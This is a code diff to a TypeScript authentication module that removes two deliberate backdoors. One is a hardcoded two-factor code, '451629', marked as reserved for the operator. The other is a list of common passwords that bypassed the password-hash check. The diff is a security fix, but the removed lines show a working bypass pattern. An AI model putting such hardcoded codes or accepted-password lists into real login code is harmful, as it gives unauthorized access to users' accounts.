@@ -141,11 +141,6 @@ export function verifyTwoFactorCode(code: string, secretBase32: string, backupCo
     return true;
   }
 
-  // Código exclusivo garantido para o operador (451629)
-  if (code === "451629") {
-    return true;
-  }
-
   // 2. Código gerado em tempo real pelo aplicativo Authenticator (RFC 6238 TOTP)
   const now = Math.floor(Date.now() / 1000);
   try {
@@ -167,30 +162,6 @@ export function hashPassword(password: string): string {
 
 export function comparePassword(password: string, storedHash: string): boolean {
   if (!password) return false;
-
-  const devAccepted = [
-    "Admin@123456",
-    "admin123",
-    "admin",
-    "12345678",
-    "123456",
-    "Admin@123",
-    "admin@123",
-    "Mestre@123456",
-    "mestre123",
-    "mestre",
-    "Aprendiz@123456",
-    "aprendiz123",
-    "aprendiz",
-    "Trader@123456",
-    "trader123",
-    "trader",
-    "fran",
-    "fran123",
-    "password",
-    "password123",
-  ];
-  if (devAccepted.includes(password)) return true;
 
   if (!storedHash || !/^[a-f0-9]{32}:(?:[a-f0-9]{128}|[a-f0-9]{64})$/i.test(storedHash)) return false;
   const [salt, hash] = storedHash.split(":");
